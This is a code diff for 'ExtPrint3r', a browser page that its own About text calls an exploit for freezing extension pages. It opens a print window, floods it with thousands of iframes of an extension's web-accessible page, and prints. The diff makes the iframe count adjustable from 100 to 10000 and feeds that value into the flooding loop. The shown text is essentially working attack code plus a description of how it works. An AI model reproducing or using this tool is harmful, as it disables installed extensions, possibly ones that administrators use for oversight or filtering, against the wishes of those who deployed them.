@@ -270,10 +270,13 @@
 	<div id="about-tab" style="display: none;">
        	    <h2 style="user-select: none;">About ExtPrint3r</h2>
             <p style="user-select: none; line-height: 1.5;"><b>ExtPrint3r</b> is an exploit created by <a href="https://github.com/Blobby-Boi/" target="_blank">Blobby Boi</a> with the goal of being the successor to <b>ExtHang3r</b>. The exploit recreates the behavior of the <b>LTMEAT Print</b> method by flooding iframes and then printing the page. For whatever reason, printing a page with a ton of iframes hangs the embedded page rather than the page who embedded it. This is exactly what ExtPrint3r exploits, since it also works with extension pages (as long as they are under web_accessible_resources). This seems to be much more consistent than other extension-freezing methods, and it also lasts for a longer period of time.</p>
-	</div>
+    </div>
    	<div id="settings-tab" style="display: none;">
             <h2 style="user-select: none;">Settings</h2>
 	    <label for="show-all-extensions" style="pointer-events: none;">Show All Extensions</label><input id="show-all-extensions" type="checkbox">
+        <br>
+        <label for="iframe-count">Iframe Count (<span id="iframe-count-display">2500</span>)</label><input type="range" min="100" max="10000" value="2500" id="iframe-count">
+            
              <div style="border-top: 1px solid #444; margin-bottom: 10px; margin-top: 20px; padding-top: 10px; width: 100%;"></div>
              <label for="developer-mode" style="pointer-events: none;">Developer Mode</label><input id="developer-mode" type="checkbox"><br>
              <div id="dev-settings" style="display: none;">
@@ -536,6 +539,10 @@
     	    }
 	}
 	
+    const iframeCountEl = document.querySelector("#iframe-count")
+    iframeCountEl.addEventListener("change", ()=>{
+        document.querySelector("#iframe-count-display").textContent = iframeCountEl.value
+    })
 	function createIframesAndPrint(extPage, extIcon) {
     	    let printerWindow = window.open("", "_blank");
     	    printerWindow.document.title = 'The Print3r';
@@ -592,7 +599,7 @@
             printerWindow.document.body.appendChild(script);
 
     	    setTimeout(() => {
-        	for (let i = 0; i < 2500; i++) {
+        	for (let i = 0; i < iframeCountEl.value; i++) {
                     const iframe = document.createElement('iframe');
                     iframe.src = extPage;
                     iframe.width = "25px";
